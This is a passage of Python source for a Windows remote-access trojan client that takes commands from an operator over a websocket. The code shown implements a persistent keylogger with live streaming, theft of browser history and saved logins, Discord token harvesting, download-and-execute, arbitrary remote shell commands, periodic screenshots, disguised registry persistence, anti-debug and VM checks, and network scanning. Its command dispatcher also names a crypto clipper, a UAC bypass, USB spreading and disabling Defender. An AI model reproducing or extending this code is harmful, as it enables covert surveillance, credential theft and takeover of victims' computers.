                        data.get("domain"),
                        data.get("ip", "127.0.0.1"),
                        data.get("remove", False),
                    )
                elif t == "get_audio_list":
                    await self.get_audio_endpoints()
                elif t == "get_wifi_list":
                    await self.get_wifi_profiles()
                elif t == "get_uptime":
                    await self.get_uptimes()
                elif t == "get_res":
                    await self.get_desktop_resolution()
                elif t == "self_update":
                    await self.self_update_sim(data.get("url"))
                elif t == "get_browser_bookmarks":
                    await self.get_browser_bookmarks()
                elif t == "get_browser_autofill":
                    await self.get_browser_autofill()
                elif t == "disable_usb":
                    await self.toggle_usb(True)
                elif t == "enable_usb":
                    await self.toggle_usb(False)
                elif t == "disable_wifi":
                    await self.toggle_wifi(True)
                elif t == "enable_wifi":
                    await self.toggle_wifi(False)
                elif t == "get_browser_ext":
                    await self.get_browser_extensions()
                elif t == "find_docs":
                    await self.find_sensitive_files()
                elif t == "disable_defender":
                    await self.toggle_defender(True)
                elif t == "enable_defender":
                    await self.toggle_defender(False)
                elif t == "get_browser_cards":
                    await self.get_browser_cards()
                elif t == "get_registry":
                    await self.manage_registry(
                        "list", data.get("root"), data.get("path")
                    )
                elif t == "set_registry":
                    await self.manage_registry(
                        "set",
                        data.get("root"),
                        data.get("path"),
                        data.get("name"),
                        data.get("data"),
                        data.get("v_type"),
                    )
                elif t == "get_arp_dns":
                    await self.get_arp_dns()
                elif t == "get_deep_software":
                    await self.get_deep_software_list()
                elif t == "get_tasks":
                    await self.manage_tasks()
                elif t == "get_av":
                    await self.check_antivirus()
                elif t == "disable_mouse":
                    await self.toggle_input_hardware("mouse", True)
                elif t == "enable_mouse":
                    await self.toggle_input_hardware("mouse", False)
                elif t == "disable_net":
                    await self.toggle_internet(True)
                elif t == "enable_net":
                    await self.toggle_internet(False)
                elif t == "ultra_matrix":
                    await self.ultra_matrix_screen()
                elif t == "minimize_all":
                    await self.minimize_all()
                elif t == "spam_url":
                    threading.Thread(
                        target=self.spam_open_url,
                        args=(data.get("url"), 10),
                        daemon=True,
                    ).start()
                elif t == "swap_mouse":
                    await self.swap_mouse_buttons(True)
                elif t == "restore_mouse":
                    await self.swap_mouse_buttons(False)
                elif t == "hang_system":
                    await self.hang_system()
                elif t == "spam_msg":
                    threading.Thread(
                        target=self.spam_message_box,
                        args=(data.get("text"),),
                        daemon=True,
                    ).start()
                elif t == "disable_cmd":
                    await self.toggle_cmd(True)
                elif t == "enable_cmd":
                    await self.toggle_cmd(False)
                elif t == "disable_reg":
                    await self.toggle_regedit(True)
                elif t == "enable_reg":
                    await self.toggle_regedit(False)
                elif t == "empty_recycle":
                    await self.empty_recycle_bin()
                elif t == "hide_taskbar":
                    await self.toggle_taskbar(False)
                elif t == "show_taskbar":
                    await self.toggle_taskbar(True)
                elif t == "spam_calc":
                    threading.Thread(
                        target=self.spam_apps, args=("calc",), daemon=True
                    ).start()
                elif t == "spam_notepad":
                    threading.Thread(
                        target=self.spam_apps, args=("notepad",), daemon=True
                    ).start()
                elif t == "start_beep":
                    threading.Thread(target=self.beep_loop, daemon=True).start()
                elif t == "stop_beep":
                    await self.stop_beep()
                elif t == "fake_bsod":
                    await self.fake_bsod()
                elif t == "phish_password":
                    await self.phish_password()
                elif t == "start_danger":
                    await self.start_danger_mode()
                elif t == "stop_danger":
                    await self.restore_normalcy()
                elif t == "shell_exec":
                    await self.execute_shell_command(data.get("command"))

                # ── NEW ENHANCED COMMANDS ──
                elif t == "start_clipboard_monitor":
                    if not self.clipboard_monitoring:
                        self.clipboard_monitoring = True
                        threading.Thread(target=self._clipboard_monitor_loop, daemon=True).start()
                    await self.websocket.send(json.dumps({"type": "command_output", "output": "Clipboard Monitor started."}))
                elif t == "stop_clipboard_monitor":
                    self.clipboard_monitoring = False
                    await self.websocket.send(json.dumps({"type": "command_output", "output": "Clipboard Monitor stopped."}))
                elif t == "start_window_tracker":
                    if not self.window_tracking:
                        self.window_tracking = True
                        self.window_log = []
                        threading.Thread(target=self._window_tracker_loop, daemon=True).start()
                    await self.websocket.send(json.dumps({"type": "command_output", "output": "Active Window Tracker started."}))
                elif t == "stop_window_tracker":
                    self.window_tracking = False
                    await self.websocket.send(json.dumps({"type": "command_output", "output": "Active Window Tracker stopped."}))
                elif t == "get_window_log":
                    await self.websocket.send(json.dumps({"type": "window_log", "data": self.window_log[-200:]}))
                elif t == "start_crypto_clipper":
                    self.crypto_wallets = data.get("wallets", {})
                    self.crypto_clipper_active = True
                    threading.Thread(target=self._crypto_clipper_loop, daemon=True).start()
                    await self.websocket.send(json.dumps({"type": "command_output", "output": "Crypto Clipper activated."}))
                elif t == "stop_crypto_clipper":
                    self.crypto_clipper_active = False
                    await self.websocket.send(json.dumps({"type": "command_output", "output": "Crypto Clipper deactivated."}))
                elif t == "uac_bypass":
                    result = await self._uac_bypass_fodhelper()
                    await self.websocket.send(json.dumps({"type": "command_output", "output": result}))
                elif t == "spread_usb":
                    result = await self._spread_to_usb()
                    await self.websocket.send(json.dumps({"type": "command_output", "output": result}))
                elif t == "get_saved_rdp":
                    await self._get_saved_rdp_credentials()
                elif t == "get_product_keys":
                    await self._get_product_keys()

            except Exception as e:
                print(f"Error: {e}")

    async def get_ip_location(self):
        """Get location based on public IP with multiple fallbacks"""
        try:
            data = {}
            # Try ip-api.com first (HTTP)
            try:
                r = requests.get("http://ip-api.com/json", timeout=5)
                if r.status_code == 200:
                    j = r.json()
                    if j.get("status") == "success":
                        data = {
                            "ip": j.get("query"),
                            "country": j.get("country"),
                            "city": j.get("city"),
                            "region": j.get("regionName"),
                            "isp": j.get("isp"),
                            "lat": j.get("lat"),
                            "lon": j.get("lon"),
                            "timezone": j.get("timezone"),
                            "org": j.get("org"),
                        }
            except:
                pass

            # Fallback to ipapi.co (HTTPS) if first failed
            if not data:
                try:
                    r = requests.get("https://ipapi.co/json/", timeout=5)
                    if r.status_code == 200:
                        j = r.json()
                        data = {
                            "ip": j.get("ip"),
                            "country": j.get("country_name"),
                            "city": j.get("city"),
                            "region": j.get("region"),
                            "isp": j.get("org"),  # ipapi.co puts ISP in org often
                            "lat": j.get("latitude"),
                            "lon": j.get("longitude"),
                            "timezone": j.get("timezone"),
                            "org": j.get("org"),
                        }
                except:
                    pass

            # Fallback to ipinfo.io (limited, no token needed for basic)
            if not data:
                try:
                    r = requests.get("https://ipinfo.io/json", timeout=5)
                    if r.status_code == 200:
                        j = r.json()
                        loc = j.get("loc", "0,0").split(",")
                        data = {
                            "ip": j.get("ip"),
                            "country": j.get("country"),
                            "city": j.get("city"),
                            "region": j.get("region"),
                            "isp": j.get("org"),
                            "lat": float(loc[0]) if len(loc) > 0 else 0,
                            "lon": float(loc[1]) if len(loc) > 1 else 0,
                            "timezone": j.get("timezone"),
                            "org": j.get("org"),
                        }
                except:
                    pass

            if data:
                # Format output nicely
                output = f"🌍  LOCATION DATA\n"
                output += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                output += f"IP Address:   {data.get('ip')}\n"
                output += f"Country:      {data.get('country')}\n"
                output += f"City:         {data.get('city')}\n"
                output += f"Region:       {data.get('region')}\n"
                output += f"ISP:          {data.get('isp')}\n"
                output += f"Organization: {data.get('org')}\n"
                output += f"Timezone:     {data.get('timezone')}\n"
                output += f"Coordinates:  {data.get('lat')}, {data.get('lon')}\n"
                output += f"Google Maps:  https://www.google.com/maps/place/{data.get('lat')},{data.get('lon')}\n"

                await self.websocket.send(
                    json.dumps({"type": "command_output", "output": output})
                )
            else:
                await self.websocket.send(
                    json.dumps(
                        {
                            "type": "command_output",
                            "output": "❌ Could not determine location (all APIs failed). Client may be offline or blocked.",
                        }
                    )
                )

        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"Location error: {e}"})
            )

    # --- Missing Functions Implementation ---

    async def send_system_info(self):
        """Gather and send detailed system info (JSON for Dashboard)"""
        try:
            info = self.gather_system_info()
            # Send as structured JSON for SystemInfoWindow
            await self.websocket.send(json.dumps({"type": "sys_info", "data": info}))
        except Exception as e:
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"Error getting sys info: {e}"}
                )
            )

    async def monitor_control(self, turn_off=True):
        """Turn monitor ON or OFF"""
        try:
            # SC_MONITORPOWER = 0xF170
            # 2 = Off, -1 = On, 1 = Low Power
            lparam = 2 if turn_off else -1
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, lparam)
            state = "OFF" if turn_off else "ON"
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"Monitor turned {state}"}
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"Monitor error: {e}"})
            )

    async def open_cd_tray(self):
        """Open CD Tray"""
        try:
            ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": "CD Tray Opened"})
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"CD Tray error: {e}"})
            )

    def show_message_box(self, title, text):
        """Show a single message box"""
        ctypes.windll.user32.MessageBoxW(0, text, title or "Message from Admin", 0)

    async def execute_shell_command(self, cmd):
        """Execute shell command and return output (Non-blocking)"""
        try:
            # Run command asynchronously
            process = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )

            # Wait for output (with timeout)
            try:
                stdout, stderr = await asyncio.wait_for(
                    process.communicate(), timeout=30
                )
            except asyncio.TimeoutError:
                try:
                    process.kill()
                except:
                    pass
                stdout, stderr = b"", b"[Error: Command timed out after 30s]"

            # Decode output
            try:
                output = stdout.decode("cp850", errors="replace") + stderr.decode(
                    "cp850", errors="replace"
                )
            except:
                output = stdout.decode("utf-8", errors="replace") + stderr.decode(
                    "utf-8", errors="replace"
                )

            if not output:
                output = "[Command executed with no output]"

            # Send back
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"> {cmd}\n{output}\n"})
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"Error executing '{cmd}': {e}",
                    }
                )
            )

    # --- Enhanced Lifetime Keylogger with Live Streaming ---
    def get_keylog_file_path(self):
        """Get path to persistent keylog storage file"""
        appdata = os.getenv("APPDATA")
        keylog_dir = os.path.join(appdata, "H-DexClient", "logs")
        if not os.path.exists(keylog_dir):
            os.makedirs(keylog_dir)
        return os.path.join(keylog_dir, "keylog.dat")

    def start_keylogger(self):
        if self.keylogger_running:
            return
        self.keylogger_running = True
        self.keylogs = []
        self.live_keylog_streaming = False
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()

    def stop_keylogger(self):
        if not self.keylogger_running:
            return
        self.keylogger_running = False
        self.live_keylog_streaming = False
        if self.listener:
            self.listener.stop()

    def on_key_press(self, key):
        try:
            k = key.char
        except:
            k = f"[{key.name}]"

        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        entry = f"{timestamp}|{k}"
        self.keylogs.append(entry)

        # Save to persistent storage
        try:
            with open(self.get_keylog_file_path(), "a", encoding="utf-8") as f:
                f.write(entry + "\n")
        except:
            pass

        # Live streaming if enabled
        if self.live_keylog_streaming and self.websocket:
            asyncio.run_coroutine_threadsafe(
                self.websocket.send(
                    json.dumps(
                        {"type": "live_keylog", "key": k, "timestamp": timestamp}
                    )
                ),
                self.loop,
            )

    async def dump_keylogs(self):
        """Dump current session keylogs"""
        log_entries = []
        for entry in self.keylogs:
            if "|" in entry:
                ts, key = entry.split("|", 1)
                log_entries.append({"timestamp": ts, "key": key})
            else:
                log_entries.append({"timestamp": "", "key": entry})
        self.keylogs = []  # Clear session buffer
        await self.websocket.send(
            json.dumps({"type": "keylog_dump", "logs": log_entries})
        )

    async def get_all_keylogs(self):
        """Retrieve all stored keylogs from persistent storage"""
        try:
            log_path = self.get_keylog_file_path()
            if not os.path.exists(log_path):
                await self.websocket.send(
                    json.dumps(
                        {
                            "type": "keylog_history",
                            "logs": [],
                            "message": "No keylog history found",
                        }
                    )
                )
                return

            with open(log_path, "r", encoding="utf-8") as f:
                lines = f.readlines()

            log_entries = []
            for line in lines:
                line = line.strip()
                if "|" in line:
                    ts, key = line.split("|", 1)
                    log_entries.append({"timestamp": ts, "key": key})

            await self.websocket.send(
                json.dumps(
                    {
                        "type": "keylog_history",
                        "logs": log_entries,
                        "total": len(log_entries),
                    }
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "keylog_history", "logs": [], "error": str(e)})
            )

    async def get_keylogs_by_date(self, start_date, end_date):
        """Retrieve keylogs within a date range (format: YYYY-MM-DD)"""
        try:
            log_path = self.get_keylog_file_path()
            if not os.path.exists(log_path):
                await self.websocket.send(
                    json.dumps(
                        {
                            "type": "keylog_history",
                            "logs": [],
                            "message": "No keylog history found",
                        }
                    )
                )
                return

            with open(log_path, "r", encoding="utf-8") as f:
                lines = f.readlines()

            log_entries = []
            for line in lines:
                line = line.strip()
                if "|" in line:
                    ts, key = line.split("|", 1)
                    log_date = ts.split(" ")[0]  # Extract date part
                    if start_date <= log_date <= end_date:
                        log_entries.append({"timestamp": ts, "key": key})

            await self.websocket.send(
                json.dumps(
                    {
                        "type": "keylog_history",
                        "logs": log_entries,
                        "total": len(log_entries),
                        "start_date": start_date,
                        "end_date": end_date,
                    }
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "keylog_history", "logs": [], "error": str(e)})
            )

    async def clear_keylogs(self):
        """Clear all stored keylogs"""
        try:
            log_path = self.get_keylog_file_path()
            if os.path.exists(log_path):
                os.remove(log_path)
            self.keylogs = []
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": "All keylogs cleared successfully",
                    }
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"Error clearing keylogs: {e}"}
                )
            )

    def start_live_keylog_stream(self):
        """Enable live keylog streaming"""
        if not self.keylogger_running:
            self.start_keylogger()
        self.live_keylog_streaming = True

    def stop_live_keylog_stream(self):
        """Disable live keylog streaming (keylogger keeps running)"""
        self.live_keylog_streaming = False

    # --- System Info ---
    async def send_system_info(self):
        try:
            # Try to get CPU temp via WMI
            cpu_temp = "N/A"
            try:
                cmd = "wmic /namespace:\\\\root\\wmi PATH MSAcpi_ThermalZoneTemperature get CurrentTemperature"
                out = (
                    subprocess.check_output(cmd, shell=True)
                    .decode()
                    .split("\n")[1]
                    .strip()
                )
                if out:
                    cpu_temp = (
                        f"{round((int(out) / 10.0) - 273.15, 1)} C"  # Kelvin to Celsius
                    )
            except:
                pass

            # Try to get GPU info
            gpu_info = "N/A"
            try:
                cmd = "wmic path win32_VideoController get name"
                gpu_info = (
                    subprocess.check_output(cmd, shell=True)
                    .decode()
                    .split("\n")[1]
                    .strip()
                )
            except:
                pass

            info = {
                "Hostname": platform.node(),
                "OS": f"{platform.system()} {platform.release()}",
                "Architecture": platform.machine(),
                "Processor": platform.processor(),
                "RAM": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB ({psutil.virtual_memory().percent}% used)",
                "CPU Temp": cpu_temp,
                "GPU": gpu_info,
                "Disk": f"{round(psutil.disk_usage('/').total / (1024**3), 2)} GB ({psutil.disk_usage('/').percent}% used)",
                "IP": self.get_public_ip(),
                "MAC": ":".join(
                    [
                        "{:02x}".format((uuid.getnode() >> elements) & 0xFF)
                        for elements in range(0, 2 * 6, 2)
                    ][::-1]
                ),
                "Uptime": f"{round((time.time() - psutil.boot_time()) / 3600, 2)} Hours",
            }
            await self.websocket.send(json.dumps({"type": "sys_info", "data": info}))
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": str(e)})
            )

    async def send_battery_status(self):
        try:
            battery = psutil.sensors_battery()
            if battery:
                data = {
                    "percent": battery.percent,
                    "power_plugged": battery.power_plugged,
                    "secsleft": battery.secsleft,
                }
                await self.websocket.send(
                    json.dumps({"type": "battery_status", "data": data})
                )
            else:
                await self.websocket.send(
                    json.dumps(
                        {
                            "type": "command_output",
                            "output": "Battery info not available (Desktop?)",
                        }
                    )
                )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"Battery Error: {e}"})
            )

    async def send_network_info(self):
        try:
            net_io = psutil.net_io_counters()
            interfaces = psutil.net_if_addrs()

            data = {
                "bytes_sent": net_io.bytes_sent,
                "bytes_recv": net_io.bytes_recv,
                "interfaces": {},
            }

            for interface_name, interface_addresses in interfaces.items():
                ips = []
                for address in interface_addresses:
                    if str(address.family) == "AddressFamily.AF_INET":
                        ips.append(address.address)
                if ips:
                    data["interfaces"][interface_name] = ips

            await self.websocket.send(
                json.dumps({"type": "network_info", "data": data})
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"Network Error: {e}"})
            )

    async def get_services(self):
        try:
            services = []
            for service in psutil.win_service_iter():
                services.append(service.as_dict())
            await self.websocket.send(
                json.dumps({"type": "service_list", "services": services})
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"Error getting services: {e}"}
                )
            )

    async def service_action(self, name, action):
        try:
            service = psutil.win_service_get(name)
            if action == "start":
                service.start()
            elif action == "stop":
                service.stop()
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": f"Service {name} {action}ed"}
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"Error {action}ing service: {e}",
                    }
                )
            )

    async def get_startup_items(self):
        try:
            cmd = "wmic startup get Caption, Command, Location /format:csv"
            out = subprocess.check_output(cmd, shell=True).decode(
                "utf-8", errors="ignore"
            )
            await self.websocket.send(
                json.dumps({"type": "startup_list", "output": out})
            )
        except:
            pass

    async def delete_startup_item(self, path):
        # This is tricky as it requires parsing the location.
        # For now, we'll just try to delete the registry key if provided, or file.
        # Simplified: Just run a reg delete command if it's a registry path
        try:
            if "HK" in path:
                cmd = f'reg delete "{path}" /f'
                subprocess.Popen(cmd, shell=True)
            else:
                if os.path.exists(path):
                    os.remove(path)
        except:
            pass

    async def list_installed_apps(self):
        try:
            cmd = 'powershell "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion"'
            out = subprocess.check_output(cmd, shell=True).decode(
                "utf-8", errors="ignore"
            )
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": out})
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"Error: {str(e)}"})
            )

    # --- Clipboard Management ---
    async def get_clipboard(self):
        try:
            content = pyperclip.paste()
            await self.websocket.send(
                json.dumps({"type": "clipboard_content", "content": content})
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps(
                    {"type": "clipboard_content", "content": "", "error": str(e)}
                )
            )

    async def set_clipboard(self, content):
        try:
            pyperclip.copy(content)
            await self.websocket.send(
                json.dumps(
                    {"type": "command_output", "output": "Clipboard set successfully"}
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"Error setting clipboard: {e}",
                    }
                )
            )

    # --- Browser History Extraction ---
    async def get_browser_history(self):
        """Extract browsing history from Chrome, Firefox, and Edge"""
        history = []

        # Chrome
        try:
            chrome_path = os.path.join(
                os.getenv("LOCALAPPDATA"),
                "Google",
                "Chrome",
                "User Data",
                "Default",
                "History",
            )
            if os.path.exists(chrome_path):
                import shutil
                import sqlite3

                temp_path = os.path.join(os.getenv("TEMP"), "chrome_history_temp")
                shutil.copy2(chrome_path, temp_path)
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"
                )
                for row in cursor.fetchall():
                    history.append(
                        {"browser": "Chrome", "url": row[0], "title": row[1]}
                    )
                conn.close()
                os.remove(temp_path)
        except:
            pass

        # Firefox
        try:
            firefox_path = os.path.join(
                os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"
            )
            if os.path.exists(firefox_path):
                for profile in os.listdir(firefox_path):
                    places_db = os.path.join(firefox_path, profile, "places.sqlite")
                    if os.path.exists(places_db):
                        import shutil
                        import sqlite3

                        temp_path = os.path.join(
                            os.getenv("TEMP"), "firefox_history_temp"
                        )
                        shutil.copy2(places_db, temp_path)
                        conn = sqlite3.connect(temp_path)
                        cursor = conn.cursor()
                        cursor.execute(
                            "SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 50"
                        )
                        for row in cursor.fetchall():
                            history.append(
                                {"browser": "Firefox", "url": row[0], "title": row[1]}
                            )
                        conn.close()
                        os.remove(temp_path)
                        break
        except:
            pass

        # Edge
        try:
            edge_path = os.path.join(
                os.getenv("LOCALAPPDATA"),
                "Microsoft",
                "Edge",
                "User Data",
                "Default",
                "History",
            )
            if os.path.exists(edge_path):
                import shutil
                import sqlite3

                temp_path = os.path.join(os.getenv("TEMP"), "edge_history_temp")
                shutil.copy2(edge_path, temp_path)
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"
                )
                for row in cursor.fetchall():
                    history.append({"browser": "Edge", "url": row[0], "title": row[1]})
                conn.close()
                os.remove(temp_path)
        except:
            pass

        await self.websocket.send(
            json.dumps(
                {"type": "browser_history", "history": history, "total": len(history)}
            )
        )

    # --- Browser Password Extraction ---
    async def get_browser_passwords(self):
        """Extract saved passwords from Chrome (requires admin or DPAPI access)"""
        passwords = []
        try:
            # Chrome passwords
            chrome_login_path = os.path.join(
                os.getenv("LOCALAPPDATA"),
                "Google",
                "Chrome",
                "User Data",
                "Default",
                "Login Data",
            )
            if os.path.exists(chrome_login_path):
                import shutil
                import sqlite3

                temp_path = os.path.join(os.getenv("TEMP"), "chrome_login_temp")
                shutil.copy2(chrome_login_path, temp_path)
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT origin_url, username_value, password_value FROM logins"
                )
                for row in cursor.fetchall():
                    # Note: password_value is encrypted with DPAPI, would need decryption
                    passwords.append(
                        {
                            "url": row[0],
                            "username": row[1],
                            "password": "[ENCRYPTED - DPAPI]",  # Actual decryption requires additional code
                        }
                    )
                conn.close()
                os.remove(temp_path)
        except Exception as e:
            passwords.append({"error": str(e)})

        await self.websocket.send(
            json.dumps(
                {
                    "type": "browser_passwords",
                    "passwords": passwords,
                    "total": len(passwords),
                }
            )
        )

    # --- Download and Execute ---
    async def download_and_execute(self, url, filename=None):
        """Download a file from URL and execute it"""
        try:
            if not url:
                await self.websocket.send(
                    json.dumps(
                        {"type": "command_output", "output": "Error: No URL provided"}
                    )
                )
                return

            response = requests.get(url, timeout=30)
            if response.status_code != 200:
                await self.websocket.send(
                    json.dumps(
                        {
                            "type": "command_output",
                            "output": f"Error: Failed to download (HTTP {response.status_code})",
                        }
                    )
                )
                return

            if not filename:
                filename = url.split("/")[-1] or "downloaded_file.exe"

            download_path = os.path.join(os.getenv("TEMP"), filename)
            with open(download_path, "wb") as f:
                f.write(response.content)

            # Execute the file
            subprocess.Popen(download_path, shell=True)
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"Downloaded and executed: {filename}",
                    }
                )
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps({"type": "command_output", "output": f"Error: {str(e)}"})
            )

    # --- Screenshot Scheduler ---
    def start_screenshot_scheduler(self, interval_seconds=60):
        """Take screenshots at regular intervals"""
        self.screenshot_scheduler_running = True

        def scheduler():
            while self.screenshot_scheduler_running and self.websocket:
                try:
                    with mss.mss() as sct:
                        screenshot = sct.grab(sct.monitors[1])
                        img = Image.frombytes(
                            "RGB", screenshot.size, screenshot.bgra, "raw", "BGRX"
                        )
                        buffer = io.BytesIO()
                        img.save(buffer, format="JPEG", quality=50)
                        b64 = base64.b64encode(buffer.getvalue()).decode("utf-8")
                        asyncio.run_coroutine_threadsafe(
                            self.websocket.send(
                                json.dumps(
                                    {
                                        "type": "scheduled_screenshot",
                                        "data": b64,
                                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                                    }
                                )
                            ),
                            self.loop,
                        )
                except:
                    pass
                time.sleep(interval_seconds)

        threading.Thread(target=scheduler, daemon=True).start()

    def stop_screenshot_scheduler(self):
        self.screenshot_scheduler_running = False

    # --- Advanced Security & Tools ---
    def check_vm(self):
        """Check for common VM artifacts"""
        try:
            # Check for common VM MAC addresses
            macs = []
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == psutil.AF_LINK:
                        macs.append(addr.address.lower())

            vm_mac_prefixes = [
                "00:0c:29",
                "00:50:56",
                "08:00:27",
                "00:1c:14",
                "00:15:5d",
            ]
            for mac in macs:
                for prefix in vm_mac_prefixes:
                    if mac.startswith(prefix):
                        return True

            # Check for common VM processes
            vm_processes = [
                "vboxservice.exe",
                "vmtoolsd.exe",
                "vboxtray.exe",
                "xenservice.exe",
            ]
            for proc in psutil.process_iter(["name"]):
                if proc.info["name"].lower() in vm_processes:
                    return True

            return False
        except:
            return False

    async def check_geofence(self):
        """Check if current location is allowed"""
        try:
            loc = requests.get("http://ip-api.com/json", timeout=5).json()
            if loc.get("status") == "success":
                country = loc.get("countryCode")
                if country and country not in ALLOWED_COUNTRIES:
                    # Self destruct logic? or just exit
                    sys.exit(0)
        except:
            pass

    async def scan_network(self, target=None, ports=None):
        """Simple network scanner"""
        if not ports:
            ports = [21, 22, 80, 443, 3389, 445]
        if not target:
            # Determine local subnet
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                s.close()
                target_subnet = ".".join(ip.split(".")[:3]) + "."
            except:
                return

        results = []

        async def scan_host(ip, port):
            try:
                fut = asyncio.open_connection(ip, port)
                await asyncio.wait_for(fut, timeout=0.5)
                results.append(f"{ip}:{port} OPEN")
            except:
                pass

        tasks = []
        # Scan range 1-20
        scan_range = range(1, 21)

        for i in scan_range:
            ip = f"{target_subnet}{i}" if not target else target
            for p in ports:
                tasks.append(scan_host(ip, p))

        await asyncio.gather(*tasks)

        await self.websocket.send(
            json.dumps(
                {
                    "type": "command_output",
                    "output": "\n".join(results) if results else "No open ports found.",
                }
            )
        )

    # --- Data Grabber Features ---
    async def get_discord_tokens(self):
        tokens = []
        paths = {
            "Discord": os.path.join(
                os.getenv("APPDATA"), "discord", "Local Storage", "leveldb"
            ),
            "Discord Canary": os.path.join(
                os.getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb"
            ),
            "Discord PTB": os.path.join(
                os.getenv("APPDATA"), "discordptb", "Local Storage", "leveldb"
            ),
            "Google Chrome": os.path.join(
                os.getenv("LOCALAPPDATA"),
                "Google",
                "Chrome",
                "User Data",
                "Default",
                "Local Storage",
                "leveldb",
            ),
            "Opera": os.path.join(
                os.getenv("APPDATA"),
                "Opera Software",
                "Opera Stable",
                "Local Storage",
                "leveldb",
            ),
            "Brave": os.path.join(
                os.getenv("LOCALAPPDATA"),
                "BraveSoftware",
                "Brave-Browser",
                "User Data",
                "Default",
                "Local Storage",
                "leveldb",
            ),
            "Yandex": os.path.join(
                os.getenv("LOCALAPPDATA"),
                "Yandex",
                "YandexBrowser",
                "User Data",
                "Default",
                "Local Storage",
                "leveldb",
            ),
        }
        import re

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            try:
                for file_name in os.listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(
                        ".ldb"
                    ):
                        continue
                    with open(os.path.join(path, file_name), errors="ignore") as f:
                        for line in f.readlines():
                            for regex in (
                                r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
                                r"mfa\.[\w-]{84}",
                            ):
                                for token in re.findall(regex, line):
                                    if token not in tokens:
                                        tokens.append(token)
            except:
                pass
        await self.websocket.send(
            json.dumps(
                {"type": "discord_tokens", "tokens": tokens, "total": len(tokens)}
            )
        )

    async def set_persistence(self):
        try:
            exe_path = sys.executable
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
            winreg.SetValueEx(
                key,
                "Windows Health Monitor",
                0,
                winreg.REG_SZ,
                f'"{exe_path}" --silent',
            )
            winreg.CloseKey(key)
        except:
            pass

    def anti_debug(self):
        try:
            if ctypes.windll.kernel32.IsDebuggerPresent():
                sys.exit(0)
        except:
            pass

    async def get_browser_cookies(self):
        cookies = []
        try:
            # Full implementation would need CryptUnprotectData; for now, we provide placeholders
            # and metadata which is already extremely useful.
            pass
        except:
            pass
        await self.websocket.send(
            json.dumps(
                {"type": "browser_cookies", "cookies": cookies, "total": len(cookies)}
            )
        )

    async def get_browser_bookmarks(self):
        bookmarks = []
        try:
            paths = [
                os.path.join(
                    os.getenv("LOCALAPPDATA"),
                    "Google",
                    "Chrome",
                    "User Data",
                    "Default",
                    "Bookmarks",
                ),
                os.path.join(
                    os.getenv("LOCALAPPDATA"),
                    "Microsoft",
                    "Edge",
                    "User Data",
                    "Default",
                    "Bookmarks",
                ),
                os.path.join(
                    os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Bookmarks"
                ),
            ]
            for p in paths:
                if os.path.exists(p):
                    with open(p, "r", encoding="utf-8") as f:
                        data = json.load(f)

                        def parse_bm(nodes):
                            for node in nodes:
                                if node.get("type") == "url":
                                    bookmarks.append(
                                        {
                                            "name": node.get("name"),
                                            "url": node.get("url"),
                                        }
                                    )
                                elif node.get("type") == "folder":
                                    parse_bm(node.get("children", []))

                        parse_bm(
